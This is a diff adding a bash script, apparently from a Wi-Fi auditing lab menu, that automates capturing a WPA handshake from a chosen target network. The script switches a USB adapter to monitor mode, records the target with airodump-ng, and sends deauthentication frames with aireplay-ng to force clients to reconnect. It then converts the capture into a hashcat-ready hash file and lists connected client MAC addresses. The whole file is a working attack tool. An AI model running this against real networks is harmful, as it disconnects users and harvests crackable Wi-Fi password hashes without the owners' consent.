@@ -1,0 +1,111 @@
+#!/bin/bash
+# handshake - capturar WPA handshake del objetivo elegido con 'objetivo'.
+# Solo usa el dongle RTL8814AU. Nunca toca wlan0 ni eth0.
+# Se detiene solo al ver "WPA handshake" o al pulsar Enter (max 120 s).
+
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+CAPDIR=/root/capturas_wifi
+FILE="$CAPDIR/objetivo.txt"
+LOG=/tmp/handshake-airodump.log
+W=58
+
+line() { printf '+%*s+\n' "$W" '' | tr ' ' '-'; }
+row()  { printf '| %-*s |\n' $((W-2)) "$1"; }
+pause(){ printf '\n  Pulsa Enter para continuar...'; read -r _ || true; printf '\n'; }
+
+[ -f "$FILE" ] || {
+  printf '\n  No hay objetivo. Ejecuta primero la opcion 13 del menu lab.\n'
+  pause; exit 1
+}
+
+BSSID=$(sed -n 's/^BSSID=//p' "$FILE" | head -1)
+CH=$(sed -n 's/^CH=//p' "$FILE" | head -1)
+ESSID=$(sed -n 's/^ESSID=//p' "$FILE" | head -1)
+IFACE=$(sed -n 's/^IFACE=//p' "$FILE" | head -1)
+
+[ -n "$IFACE" ] && [ -d "/sys/class/net/$IFACE" ] || IFACE=$(/usr/local/bin/audit-iface 2>/dev/null || true)
+case "$IFACE" in ''|wlan0|eth0)
+  printf '\n  No hay interfaz de auditoria disponible.\n'; pause; exit 1 ;;
+esac
+case "$BSSID" in
+  *[!0-9A-Fa-f:]*|'')
+    printf '\n  BSSID no valido en %s\n' "$FILE"; pause; exit 1 ;;
+esac
+case "$CH" in ''|'?'|0) CH=11 ;; *[!0-9]*) CH=11 ;; esac
+
+ip link set dev "$IFACE" up 2>/dev/null
+iw dev "$IFACE" set type monitor 2>/dev/null || {
+  printf '\n  No se pudo poner %s en monitor.\n' "$IFACE"; pause; exit 1; }
+iw dev "$IFACE" set monitor otherbss fcsfail 2>/dev/null || true
+iwconfig "$IFACE" channel "$CH" 2>/dev/null || true
+
+mkdir -p "$CAPDIR"
+BASE="$CAPDIR/handshake-$(date +%Y%m%d-%H%M%S)"
+
+clear 2>/dev/null || true
+line
+row "CAPTURA DE HANDSHAKE WPA"
+line
+row "  Red   : ${ESSID:-?}"
+row "  BSSID : $BSSID"
+row "  Canal : $CH"
+row "  IF    : $IFACE"
+line
+printf '\n  Capturando en segundo plano ...\n'
+
+/usr/sbin/airodump-ng --bssid "$BSSID" -c "$CH" \
+  -w "$BASE" --output-format pcapng "$IFACE" </dev/null \
+  >"$LOG" 2>&1 &
+DUMP_PID=$!
+sleep 5
+
+printf '  Enviando deauth para forzar el handshake ...\n'
+/usr/sbin/aireplay-ng -0 5 -a "$BSSID" "$IFACE" </dev/null \
+  >/tmp/handshake-aireplay.log 2>&1 || true
+
+printf '\n  Esperando handshake (Enter para cortar, max 120 s) ...\n'
+for ((t=0; t<60; t++)); do
+  if grep -aq 'WPA handshake' "$LOG"; then
+    printf '  Handshake detectado.\n'
+    break
+  fi
+  if read -r -t 2 _; then
+    printf '  Cortado por el usuario.\n'
+    break
+  fi
+done
+
+kill -INT "$DUMP_PID" 2>/dev/null || true
+sleep 2
+kill -9 "$DUMP_PID" 2>/dev/null || true
+wait "$DUMP_PID" 2>/dev/null || true
+
+PCAP=$(ls -1 "$BASE"-*.pcapng "$BASE"-*.cap 2>/dev/null | head -1)
+clear 2>/dev/null || true
+line
+row "RESULTADO"
+line
+if [ -n "$PCAP" ]; then
+  printf '  captura : %s (%s bytes)\n' "$PCAP" "$(stat -c %s "$PCAP")"
+  /usr/bin/hcxpcapngtool -o "$BASE.22000" "$PCAP" \
+    >"$BASE.conv.log" 2>&1 || true
+  if [ -f "$BASE.22000" ]; then
+    printf '  22000   : %s\n' "$BASE.22000"
+    printf '  hashes  : %s\n' "$(wc -l < "$BASE.22000")"
+  else
+    printf '  22000   : no generado (ver %s)\n' "$BASE.conv.log"
+  fi
+  if grep -aq 'WPA handshake' "$LOG"; then
+    row "  HANDSHAKE CAPTURADO"
+  else
+    row "  Sin handshake: acerca el dongle o reintenta"
+  fi
+  printf '  Clientes detectados:\n'
+  /usr/bin/tshark -r "$PCAP" -Y 'wlan.fc.type_subtype==0x04 || wlan.fc.type_subtype==0x00' \
+    -T fields -e wlan.sa 2>/dev/null | sort -u | head -10
+else
+  printf '  No se genero captura. Revisa %s\n' "$LOG"
+fi
+line
+printf '  %s sigue en modo monitor.\n' "$IFACE"
+pause
